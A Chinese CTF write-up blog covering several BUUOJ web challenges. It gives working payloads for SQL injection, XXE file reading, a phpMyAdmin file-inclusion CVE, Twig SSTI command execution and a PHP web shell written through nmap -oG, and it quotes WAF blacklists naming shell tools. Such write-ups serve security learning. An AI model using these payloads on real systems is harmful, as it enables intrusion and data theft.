    <content type="html"><![CDATA[<h1 id="BUUOJ刷题"><a href="#BUUOJ刷题" class="headerlink" title="BUUOJ刷题"></a>BUUOJ刷题</h1><h2 id="极客大挑战-2019-HardSQL-1"><a href="#极客大挑战-2019-HardSQL-1" class="headerlink" title="[极客大挑战 2019]HardSQL 1"></a>[极客大挑战 2019]HardSQL 1</h2><p>MariaDB，waf很顶，空格被过滤，会返回报错信息，报错函数没被过滤，故用报错函数</p><p>可以用updatexml或者extractvalue</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">爆库名 //geek<br><span class="hljs-number">1</span><span class="hljs-string">&#x27;or(updatexml(0,concat(0x5e,database()),0))#</span><br><span class="hljs-string">爆表名 &#x27;</span>=<span class="hljs-string">&#x27;可以用like代替，&#x27;</span>=<span class="hljs-string">&#x27;被waf了 //H4rDsq1</span><br><span class="hljs-string">1&#x27;</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">0</span>,concat(<span class="hljs-number">0x5e</span>，(select(group_concat(table_name))<span class="hljs-keyword">from</span>(information_schema.tables)where(table_schema)like(<span class="hljs-string">&#x27;geek&#x27;</span>))),<span class="hljs-number">0</span>))<span class="hljs-comment">#</span><br><span class="hljs-number">1</span><span class="hljs-string">&#x27;or(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;</span>geek<span class="hljs-string">&#x27;)),0x7e)))#</span><br><span class="hljs-string">爆列名 //id,username,password</span><br><span class="hljs-string">1&#x27;</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">0</span>,concat(<span class="hljs-number">0x5e</span>,(select(group_concat(column_name))<span class="hljs-keyword">from</span>(information_schema.columns)where(table_name)like(<span class="hljs-string">&#x27;H4rDsq1&#x27;</span>))),<span class="hljs-number">0</span>))<span class="hljs-comment">#</span><br>爆列值，报错只回显<span class="hljs-number">32</span>位，可以用截断函数right()，或者regexp脚本爆破<br><span class="hljs-number">1</span><span class="hljs-string">&#x27;or(updatexml(0,concat(0x5e,(select(group_concat(password))from(H4rDsq1))),0))#</span><br><span class="hljs-string">1&#x27;</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">0</span>,concat(<span class="hljs-number">0x5e</span>,right((select(group_concat(password))<span class="hljs-keyword">from</span>(H4rDsq1)),<span class="hljs-number">31</span>)),<span class="hljs-number">0</span>))<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h2 id="GYCTF2020-Blacklist-1"><a href="#GYCTF2020-Blacklist-1" class="headerlink" title="[GYCTF2020]Blacklist 1"></a>[GYCTF2020]Blacklist 1</h2><p>Mysql，有waf如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;</span>,<span class="hljs-variable">$inject</span>);<br></code></pre></td></tr></table></figure><p>发现可以堆叠注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show databases;--+</span><br><span class="hljs-string">1&#x27;</span>;show tables;--+ //FlagHere<br></code></pre></td></tr></table></figure><p>尝试无果，sqlmap跑不动，遂查</p><p>有handler语法，mysql专用的语句</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">handler FlagHere <span class="hljs-built_in">open</span><br>handler FlagHere read first<br>handler FlagHere close<br></code></pre></td></tr></table></figure><p>所以用1’闭合单引号后接堆叠handler语句即可</p><h2 id="RoarCTF-2019-Easy-Java-1"><a href="#RoarCTF-2019-Easy-Java-1" class="headerlink" title="[RoarCTF 2019]Easy Java 1"></a>[RoarCTF 2019]Easy Java 1</h2><p>java不会，故搜</p><p>提到了WEB-INF&#x2F;目录下的文件泄露，包含以下文件或目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markd">/WEB-INF/web.xml: WEB应用程序配置文件，描述了servlet和其他的应用组件配置及命名规则<br>/WEB-INF/classes/: 含站点所有用的class文件，包括servlet class和非servlet class，他们不包含在jar中<br>/WEB-INF/lib/: 存放web应用需要的各种jar文件，放置仅在这个应用中要求使用的jar文件，如数据库驱动jar文件<br>/WEB-INF/src/: 源码目录，按照包名结构放置各个java文件<br>/WEB-INF/database.properties: 数据库配置文件<br></code></pre></td></tr></table></figure><p>好像提到了servlet访问URL映射配置，这块我还不是很清楚</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown">由于客户端是通过URL地址访问Web服务器中的资源，所以Servlet程序若想被外界访问，必须把Servlet程序映射到一个URL地址上，这个工作在web.xml文件中使用<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span></span>元素和<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span></span>元素完成。<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span></span>元素用于注册Servlet，它包含有两个主要的子元素：<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span></span>和<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span></span>，分别用于设置Servlet的注册名称和Servlet的完整类名。一个<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span></span>元素用于映射一个已注册的Servlet的一个对外访问路径，它包含有两个子元素：<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span></span>和<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span></span>，分别用于指定Servlet的注册名称和Servlet的对外访问路径。例如：<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span></span><br><span class="hljs-code">    &lt;servlet-name&gt;ServletDemo1&lt;/servlet-name&gt;</span><br><span class="hljs-code">    &lt;servlet-class&gt;cn.itcast.ServletDemo1&lt;/servlet-class&gt;</span><br><span class="hljs-code">&lt;/servlet&gt;</span><br><span class="hljs-code">&lt;servlet-mapping&gt;</span><br><span class="hljs-code">    &lt;servlet-name&gt;ServletDemo1&lt;/servlet-name&gt;</span><br><span class="hljs-code">    &lt;url-pattern&gt;/ServletDemo1&lt;/url-pattern&gt;</span><br><span class="hljs-code">&lt;/servlet-mapping&gt;</span><br></code></pre></td></tr></table></figure><p>servlet原来是java web开发框架的重要基础，处理服务端使用的一个java接口，被Tomcat广泛使用（但是我也不知道Tomcat），好像仅仅只作为一个<strong>统一</strong>的web应用规范来使用</p><p>Tomcat是一个java web应用服务器，隶属于Apache，更深的便没细看，感觉就是启动服务用的engine之类的</p><h2 id="网鼎杯-2018-Fakebook-1"><a href="#网鼎杯-2018-Fakebook-1" class="headerlink" title="[网鼎杯 2018]Fakebook 1"></a>[网鼎杯 2018]Fakebook 1</h2><p>这题我一开始以为是xss，后来以为是sql注入，再后来以为就扫目录php审计，结果到最后还是sql注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">?no=-<span class="hljs-number">1</span> union/**/select <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span>,<span class="hljs-number">4</span><br>?no=-<span class="hljs-number">1</span> union/**/select <span class="hljs-number">1</span>,user(),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>  //root<br></code></pre></td></tr></table></figure><p>那么可以联合注入的话，又是root权限，直接用load_file()绝对路径加载flag.php</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">?no=-<span class="hljs-number">1</span> union/**/select <span class="hljs-number">1</span>,load_file(<span class="hljs-string">&quot;/var/www/html/flag.php&quot;</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>但这是个非预期解，预期解是要扫目录扫出robots.txt，然后备份了一份user.php.bak，是一个user类</p><p>其中存放的就是注册的信息，但是对blog的waf很猛，所以基本没法从（序列化之前）一般的途径入手</p><p>但是我们通过sql注入可以得到当前的表的四个字段分别是no,username,age,blog</p><p>所以只需要在4这个位置放一个序列化之后的数据，比如file:&#x2F;&#x2F;伪协议读取，就能成功运行读到了</p><h2 id="BUUCTF-2018-Online-Tool-1"><a href="#BUUCTF-2018-Online-Tool-1" class="headerlink" title="[BUUCTF 2018]Online Tool 1"></a>[BUUCTF 2018]Online Tool 1</h2><p>提到了escapeshellarg和escapeshellcmd，倒是新东西，可以找找绕过的方法</p><p>escapeshellarg先对传入进来的参数中如果有单引号，那么进行转义，再用单引号将左右两部分括起来从而连接</p><p>escapeshellcmd会对传入的参数中所有危险字符前面加上反斜线（\），反斜线（\）会在以下字符之前插入：&amp;#;`|*?~&lt;&gt;^()[]{}$\、<code>\x0A</code> 和 <code>\xFF</code>。 <code>&#39;</code> 和 <code>&quot;</code> 仅在不配对儿的时候被转义。在 Windows 平台上，所有这些字符以及 <code>%</code> 和 <code>!</code> 字符前面都有一个插入符号（<code>^</code>）</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs matlab">params: jednersaous&#x27; -xd -<span class="hljs-built_in">sec</span> a=<span class="hljs-number">1</span><br>escapeshellarg(params): <span class="hljs-string">&#x27;jednersaous&#x27;</span>\<span class="hljs-string">&#x27;&#x27;</span> -xd -<span class="hljs-built_in">sec</span> a=<span class="hljs-number">1</span>&#x27;<br>escapeshellcmd(params): <span class="hljs-string">&#x27;jednersaous&#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span> -xd -<span class="hljs-built_in">sec</span> a=<span class="hljs-number">1</span>\<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>从上述示例可得，<code>\\</code>被解释为<code>\</code>而不再是用于转义字符，所以紧接着的<code>&#39;</code>没有被转义，在和后面的单引号配对构成了一个空白的连接符，即变成如下形式</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-variable">$command</span> jednersaous\ -xd -sec <span class="hljs-attribute">a</span>=1<br></code></pre></td></tr></table></figure><p>那么对于此题应该如何去做呢？毕竟这个也不算是强RCE，此题的nmap前提则不是空设而是关键</p><p>nmap命令中有一个参数-oG可以将命令和结果写到文件中，因此我们就要构造一个payload让nmap可以正确运行，并且用-oG去把这个命令保存为一个在web目录下的php文件</p><p>不知道为什么我在phpstorm里复现有点问题，难不成是单双引号又双叒哪里冲突了？？？</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?host=&#x27; </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> @<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;hack&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> -oG hack.php &#x27;</span><br></code></pre></td></tr></table></figure><p>但是环境里倒是可以跑，太恶心了</p><h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>要用githack来拿到备份文件，<code>.git</code>显示403Forbidden</p><p>关键是下面这个正则的绕过，前面和后面的正则感觉完全可以不考虑</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, $_GET[<span class="hljs-string">&#x27;exp&#x27;</span>])<br></code></pre></td></tr></table></figure><p>对于这个正则式只能使用形如a(b(c()));a()这样无参数的表达式，即参数可以是void的函数，下面列出几个吧</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">getenv()<span class="hljs-comment">//获取当前环境变量</span><br>localeconv()<span class="hljs-comment">//</span><br>get_defined_vars()<span class="hljs-comment">//返回有所有已定义变量所组成的数组</span><br><span class="hljs-built_in">array</span>_rand()<span class="hljs-comment">//从数组中随机取出一个或多个单元</span><br><span class="hljs-built_in">array</span>_reverse()<span class="hljs-comment">//返回单元顺序相反的数组</span><br><span class="hljs-built_in">array</span>_flip()<span class="hljs-comment">//交换数组中的键和值</span><br>current() || pos()<span class="hljs-comment">//返回数组中的当前单元</span><br>getallheaders()<span class="hljs-comment">//获取信息头</span><br>session_id()<span class="hljs-comment">//获取/设置当前会话ID</span><br>highlight_file()<span class="hljs-comment">//高亮一个文件</span><br>show_source()<span class="hljs-comment">//同highlight_file</span><br>getcwd()<span class="hljs-comment">//获取当前工作目录</span><br>scandir()<span class="hljs-comment">//列出指定路径中的文件和目录</span><br>dirname()<span class="hljs-comment">//返回路径中的目录部分</span><br><br>var_dump()<span class="hljs-comment">//dump出值</span><br>print_r()<span class="hljs-comment">//打印出值</span><br><br>next()<span class="hljs-comment">//数组的下一个值</span><br>end()<span class="hljs-comment">//数组的最后一个值</span><br></code></pre></td></tr></table></figure><p>可以构造payload如下</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-id">#1</span> <span class="hljs-selector-tag">var_dump</span>(<span class="hljs-built_in">localeconv</span>());<br><span class="hljs-selector-id">#2</span> <span class="hljs-selector-tag">var_dump</span>(<span class="hljs-built_in">scandir</span>(<span class="hljs-built_in">pos</span>(<span class="hljs-built_in">localeconv</span>())));<br><span class="hljs-selector-id">#3</span> <span class="hljs-selector-tag">highlight_file</span>(<span class="hljs-built_in">next</span>(<span class="hljs-built_in">array_reverse</span>(<span class="hljs-built_in">scandir</span>(<span class="hljs-built_in">pos</span>(<span class="hljs-built_in">localeconv</span>())))));<br></code></pre></td></tr></table></figure><h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>登录页面传输数据是xml，黑盒，XXE，没做任何限制</p><p>抓包改xml，随便网上找一个file:&#x2F;&#x2F;读文件的就行，注意换行符空格符就可，burp一直是喜欢帮你改格式的</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">message</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">foo</span> <span class="hljs-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><br><span class="hljs-symbol">&amp;xxe;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><p>nm又要扫，天天不整点扫描的东西都不能入门ctf是吧</p><p>有目录phpinfo.php()，phpmyadmin&#x2F;index.php，版本号MySQL_5.5.62，php_7.2.24，phpmyadmin4.8.1</p><p>CVE-2018-12613，index.php中存在文件包含漏洞，payload如下</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/phpmyadmin/i</span>ndex.php?target=db_sql.php%<span class="hljs-number">253</span>f<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>flag<br></code></pre></td></tr></table></figure><p>%253f是?的URL二次编码</p><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>又是扫目录</p><p>index.php</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;?php<br>include <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-variable">$yds</span> = <span class="hljs-string">&quot;dog&quot;</span>;<br><span class="hljs-variable">$is</span> = <span class="hljs-string">&quot;cat&quot;</span>;<br><span class="hljs-variable">$handsome</span> = <span class="hljs-string">&#x27;yds&#x27;</span>;<br><br>foreach(<span class="hljs-variable">$_POST</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    $<span class="hljs-variable">$x</span> = <span class="hljs-variable">$y</span>  ;  <span class="hljs-regexp">//</span>post 声明至当前文件<br>&#125;<br>foreach(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    $<span class="hljs-variable">$x</span> = $<span class="hljs-variable">$y</span>;  <span class="hljs-regexp">//</span>GET型变量重新赋值为当前文件变量中以其值为键名的值<br>&#125;<br>foreach(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-variable">$x</span> &amp;&amp; <span class="hljs-variable">$x</span> !== <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;　 <span class="hljs-regexp">//</span>传入的变量为flag   value不是flag<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$handsome</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(!isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; !isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$yds</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>  || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$is</span>);<br>&#125;<br>echo <span class="hljs-string">&quot;the flag is: &quot;</span>.<span class="hljs-variable">$flag</span>;<br></code></pre></td></tr></table></figure><p>$$x &#x3D; $($x)</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-section">#1 $x === &#x27;flag&#x27; \$<span class="hljs-emphasis">_GET[&#x27;flag&#x27;] !== $x</span></span><br><span class="hljs-emphasis"><span class="hljs-section">#2 flag用GET和POST都要传</span></span><br><span class="hljs-emphasis"><span class="hljs-section">#3 \$_</span>POST[&#x27;flag&#x27;] !== &#x27;flag&#x27; &amp;&amp; \$<span class="hljs-emphasis">_GET[&#x27;flag&#x27;] !== &#x27;flag&#x27;</span></span><br></code></pre></td></tr></table></figure><p>exp</p><p>exit(int $status)，如果status是一个字符串，在退出之前会打印status</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?yds=flag 直接<span class="hljs-keyword">exit</span>(<span class="hljs-variable">$yds</span>) =&gt; <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$flag</span>)<br></code></pre></td></tr></table></figure><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p>首先要知道php有哪些常用的模板，一般是Twig，smarty</p><p>但是jinja2和mako好像也有php重写</p><p>这里用<code>&#123;&#123;7*'7'&#125;&#125;</code>可以判断是Twig模板</p><p>直接打SSTI公式化如下</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.registerUndefinedFilterCallback</span>(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.getFilter</span>(<span class="hljs-name">&quot;命令&quot;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><p>黑盒，先通过img参数逆推出是进行了一次16进制编码和两次base64编码，于是要先拿index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) <br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>])));<br><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;xixi～ no flag&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$txt</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="hljs-variable">$txt</span> . <span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$cmd</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;forbid ~&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$cmd</span>`;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>后面的waf直接用反斜杠插入shell命令就可以了，虽然好像匹配了转义之后的反斜杠，但好像没用（？等我复现下</p><p>然后就是md5的强碰撞，因为用string强制类型转化了，所以不能用数组绕过，这里给出搜索之后得到的一个碰撞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">%<span class="hljs-number">4</span>d%c9%<span class="hljs-number">68</span>%ff%<span class="hljs-number">0</span>e%e3%<span class="hljs-number">5</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">95</span>%<span class="hljs-number">72</span>%d4%<span class="hljs-number">77</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">72</span>%<span class="hljs-number">15</span>%<span class="hljs-number">87</span>%d3%<span class="hljs-number">6</span>f%a7%b2%<span class="hljs-number">1</span>b%dc%<span class="hljs-number">56</span>%b7%<span class="hljs-number">4</span>a%<span class="hljs-number">3</span>d%c0%<span class="hljs-number">78</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">7</span>b%<span 